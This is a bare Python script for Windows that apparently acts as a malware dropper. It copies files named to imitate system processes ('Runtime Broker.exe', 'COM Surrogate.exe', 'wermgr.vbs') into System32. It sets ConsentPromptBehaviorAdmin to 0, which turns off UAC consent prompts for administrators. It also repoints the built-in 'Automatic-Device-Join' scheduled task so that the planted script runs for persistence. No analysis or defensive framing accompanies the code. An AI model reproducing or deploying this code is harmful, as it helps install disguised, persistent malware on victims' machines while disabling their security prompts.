import subprocess,winreg
a=subprocess.Popen('xcopy "Runtime Broker.exe" "C:\\Windows\\System32"',shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
av=subprocess.Popen('xcopy "COM Surrogate.exe" "C:\\Windows\\System32"',shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
ba=subprocess.Popen('xcopy "wermgr.vbs" "C:\\Windows\\System32"',shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_DWORD,value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        raise
create_reg_key('ConsentPromptBehaviorAdmin',0)
ah=subprocess.Popen('schtasks /change /enable /tn "\Microsoft\Windows\Workplace Join\Automatic-Device-Join" /tr "C:\Windows\System32\wermgr.vbs"',shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
